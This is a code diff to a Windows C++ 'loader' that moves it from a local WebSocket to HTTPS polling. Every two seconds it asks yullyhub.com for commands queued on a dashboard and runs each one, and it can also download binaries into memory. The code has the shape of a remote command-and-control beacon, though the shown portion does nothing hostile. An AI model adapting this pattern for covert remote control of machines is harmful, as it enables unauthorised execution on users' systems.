@@ -7,6 +7,7 @@
 #include <bcrypt.h>
 #include <shellapi.h>
 #include <rpc.h>
+#include <winhttp.h>
 #include <string>
 #include <vector>
 #include <thread>
@@ -22,6 +23,16 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "bcrypt.lib")
 
+// Default control-plane host. Overridable at runtime via YULLY_HOST env.
+// Vercel serverless can't hold a WebSocket so we poll HTTPS instead.
+static const char* DEFAULT_API_HOST = "yullyhub.com";
+static bool  g_api_https = true;
+static std::string g_api_host = DEFAULT_API_HOST;
+static int   g_api_port = 443;
+static std::string g_loader_id;   // random UUID picked at startup
+
+// Legacy — only used if YULLY_HOST is missing and we fall back to WS on
+// localhost for local dev.
 static const char* SERVER_HOST = "127.0.0.1";
 static const char* SERVER_PORT = "3000";
 static const char* WS_PATH = "/ws";
@@ -213,7 +224,30 @@ static std::vector<unsigned char> decode_chunked_bytes(const unsigned char* body
 }
 
 /* ========== HTTP download to memory ========== */
+// Forward-decl — the WinHTTP helper lives below this function.
+static bool wh_get_bytes(const std::string& host, int port, bool https,
+                         const std::string& path,
+                         std::vector<unsigned char>& out);
+
 static bool http_download_bytes(const std::string& url, std::vector<unsigned char>& outBytes) {
+    // HTTPS routes through WinHTTP so we can talk to Vercel / the public
+    // domain. Plain HTTP keeps using the raw-socket path so behaviour on
+    // localhost during dev is unchanged.
+    if (url.compare(0, 8, "https://") == 0) {
+        std::string s = url.substr(8);
+        size_t slash = s.find('/');
+        std::string authority = (slash == std::string::npos) ? s : s.substr(0, slash);
+        std::string path = (slash == std::string::npos) ? "/" : s.substr(slash);
+        std::string host = authority;
+        int port = 443;
+        size_t colon = authority.find(':');
+        if (colon != std::string::npos) {
+            host = authority.substr(0, colon);
+            try { port = std::stoi(authority.substr(colon + 1)); } catch (...) {}
+        }
+        return wh_get_bytes(host, port, true, path, outBytes);
+    }
+
     std::string host, path;
     int port;
     if (!parse_http_url(url, host, port, path)) {
@@ -277,6 +311,152 @@ static bool http_download_bytes(const std::string& url, std::vector<unsigned cha
         outBytes.assign(body, body + bodyLen);
     }
     return true;
+}
+
+// ========================================================================
+//  WinHTTP-based HTTPS helpers — used for the polling control plane and
+//  for downloads from the Vercel domain (yullyhub.com). Raw sockets only
+//  do plain HTTP; anything TLS goes through here.
+// ========================================================================
+static std::wstring toW(const std::string& s) {
+    if (s.empty()) return L"";
+    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
+    std::wstring w(n, L'\0');
+    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
+    return w;
+}
+
+static bool wh_request(const std::wstring& host, int port, bool https,
+                       const std::wstring& method, const std::wstring& path,
+                       const std::string& body, std::vector<unsigned char>& outBytes,
+                       long* outStatus = nullptr) {
+    HINTERNET hSess = WinHttpOpen(L"YullyLoader/1.0",
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSess) return false;
+
+    HINTERNET hCon = WinHttpConnect(hSess, host.c_str(), (INTERNET_PORT)port, 0);
+    if (!hCon) { WinHttpCloseHandle(hSess); return false; }
+
+    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hReq = WinHttpOpenRequest(hCon, method.c_str(), path.c_str(),
+        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    if (!hReq) { WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSess); return false; }
+
+    std::wstring headers;
+    if (!body.empty()) headers = L"Content-Type: application/json\r\n";
+
+    bool ok = WinHttpSendRequest(hReq,
+        headers.empty() ? WINHTTP_NO_ADDITIONAL_HEADERS : headers.c_str(),
+        (DWORD)headers.size(),
+        body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.data(),
+        (DWORD)body.size(), (DWORD)body.size(), 0)
+     && WinHttpReceiveResponse(hReq, nullptr);
+
+    if (ok) {
+        DWORD sc = 0, sz = sizeof(sc);
+        WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+            WINHTTP_HEADER_NAME_BY_INDEX, &sc, &sz, WINHTTP_NO_HEADER_INDEX);
+        if (outStatus) *outStatus = (long)sc;
+        for (;;) {
+            DWORD avail = 0;
+            if (!WinHttpQueryDataAvailable(hReq, &avail) || avail == 0) break;
+            size_t off = outBytes.size();
+            outBytes.resize(off + avail);
+            DWORD read = 0;
+            if (!WinHttpReadData(hReq, outBytes.data() + off, avail, &read) || read == 0) break;
+            outBytes.resize(off + read);
+        }
+    }
+    WinHttpCloseHandle(hReq);
+    WinHttpCloseHandle(hCon);
+    WinHttpCloseHandle(hSess);
+    return ok;
+}
+
+static bool wh_get_string(const std::string& host, int port, bool https,
+                          const std::string& path, std::string& outText,
+                          long* outStatus = nullptr) {
+    std::vector<unsigned char> buf;
+    if (!wh_request(toW(host), port, https, L"GET", toW(path), "", buf, outStatus)) return false;
+    outText.assign((char*)buf.data(), buf.size());
+    return true;
+}
+
+static bool wh_post_json(const std::string& host, int port, bool https,
+                         const std::string& path, const std::string& body,
+                         std::string& outText, long* outStatus = nullptr) {
+    std::vector<unsigned char> buf;
+    if (!wh_request(toW(host), port, https, L"POST", toW(path), body, buf, outStatus)) return false;
+    outText.assign((char*)buf.data(), buf.size());
+    return true;
+}
+
+static bool wh_get_bytes(const std::string& host, int port, bool https,
+                         const std::string& path,
+                         std::vector<unsigned char>& out) {
+    long sc = 0;
+    if (!wh_request(toW(host), port, https, L"GET", toW(path), "", out, &sc)) return false;
+    return sc == 200;
+}
+
+// Naive JSON walker — pulls out each top-level object inside an array
+// under `key`. Only used for the polling response's "commands" field.
+static std::vector<std::string> extract_object_array(const std::string& json, const std::string& key) {
+    std::vector<std::string> out;
+    std::string needle = "\"" + key + "\"";
+    size_t p = json.find(needle);
+    if (p == std::string::npos) return out;
+    p = json.find('[', p);
+    if (p == std::string::npos) return out;
+    p++;
+    while (p < json.size()) {
+        while (p < json.size() && (json[p]==' '||json[p]==','||json[p]=='\n'||json[p]=='\t'||json[p]=='\r')) p++;
+        if (p >= json.size() || json[p] == ']') break;
+        if (json[p] != '{') break;
+        size_t start = p;
+        int depth = 0;
+        bool inStr = false, esc = false;
+        while (p < json.size()) {
+            char c = json[p];
+            if (esc) { esc = false; p++; continue; }
+            if (c == '\\') { esc = true; p++; continue; }
+            if (c == '"') { inStr = !inStr; p++; continue; }
+            if (!inStr) {
+                if (c == '{') depth++;
+                else if (c == '}') { depth--; if (depth == 0) { p++; break; } }
+            }
+            p++;
+        }
+        out.push_back(json.substr(start, p - start));
+    }
+    return out;
+}
+
+// Read YULLY_HOST env, split scheme + host, populate g_api_host/g_api_port/g_api_https.
+static void configure_from_env() {
+    char buf[512];
+    DWORD n = GetEnvironmentVariableA("YULLY_HOST", buf, (DWORD)sizeof(buf));
+    std::string s = (n > 0 && n < sizeof(buf)) ? std::string(buf, n) : std::string(DEFAULT_API_HOST);
+    // strip scheme
+    if (s.rfind("https://", 0) == 0) { g_api_https = true;  s = s.substr(8); g_api_port = 443; }
+    else if (s.rfind("http://", 0) == 0) { g_api_https = false; s = s.substr(7); g_api_port = 80; }
+    else { g_api_https = true; g_api_port = 443; }
+    size_t slash = s.find('/');
+    if (slash != std::string::npos) s = s.substr(0, slash);
+    size_t colon = s.find(':');
+    if (colon != std::string::npos) {
+        g_api_host = s.substr(0, colon);
+        try { g_api_port = std::stoi(s.substr(colon + 1)); } catch (...) {}
+    } else {
+        g_api_host = s;
+    }
+    // A random-ish loader id — plain hex, no dashes.
+    UUID id; UuidCreate(&id);
+    char* str = nullptr;
+    UuidToStringA(&id, (RPC_CSTR*)&str);
+    if (str) { g_loader_id = str; RpcStringFreeA((RPC_CSTR*)&str); }
+    else     { g_loader_id = std::to_string(GetTickCount()); }
 }
 
 /* ==========================================================
@@ -1261,23 +1441,61 @@ static BOOL WINAPI console_ctrl_handler(DWORD ctrlType) {
     return FALSE; // let default handler proceed with process shutdown
 }
 
+// HTTPS-polling control plane — replaces the localhost WebSocket for
+// the customer-facing distribution. Every 2 seconds we hit
+// /api/loader/poll?id=<uuid> on the configured host and drain any
+// commands the dashboard queued via /api/loader/dispatch.
+static void poll_session() {
+    std::cout << "[loader] control plane: "
+              << (g_api_https ? "https" : "http") << "://"
+              << g_api_host << ":" << g_api_port
+              << "/api/loader/poll?id=" << g_loader_id.substr(0, 8) << "..." << std::endl;
+    while (true) {
+        std::string body;
+        long sc = 0;
+        std::string path = "/api/loader/poll?id=" + g_loader_id;
+        bool ok = wh_get_string(g_api_host, g_api_port, g_api_https, path, body, &sc);
+        if (!ok || sc != 200) {
+            std::cerr << "[loader] poll failed sc=" << sc << " — retrying in 5s" << std::endl;
+            std::this_thread::sleep_for(std::chrono::seconds(5));
+            continue;
+        }
+        auto cmds = extract_object_array(body, "commands");
+        for (auto& c : cmds) {
+            std::string payload = c;
+            std::thread([payload]() { handle_command(payload); }).detach();
+        }
+        std::this_thread::sleep_for(std::chrono::seconds(2));
+    }
+}
+
 int main(int argc, char** argv) {
     (void)argc; (void)argv;
 
     install_child_kill_switch();
     SetConsoleCtrlHandler(console_ctrl_handler, TRUE);
+    configure_from_env();
 
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
         std::cerr << "WSAStartup failed" << std::endl;
         return 1;
     }
-    std::cout << "[loader] starting, WS -> ws://" << SERVER_HOST << ":" << SERVER_PORT << WS_PATH << std::endl;
+    std::cout << "[loader] id=" << g_loader_id.substr(0, 8) << " host=" << g_api_host << std::endl;
     spawn_island_overlay();
-    while (true) {
-        ws_session();
-        std::cout << "[loader] reconnecting in 2s..." << std::endl;
-        std::this_thread::sleep_for(std::chrono::seconds(2));
+
+    // On localhost (dev), keep the legacy WebSocket path — it's a lot
+    // lower-latency for the operator on the same machine. On any public
+    // host we go HTTPS polling because Vercel serverless can't hold a WS.
+    bool useLocalWS = (g_api_host == "127.0.0.1" || g_api_host == "localhost");
+    if (useLocalWS) {
+        while (true) {
+            ws_session();
+            std::cout << "[loader] reconnecting in 2s..." << std::endl;
+            std::this_thread::sleep_for(std::chrono::seconds(2));
+        }
+    } else {
+        poll_session();
     }
     WSACleanup();
     return 0;
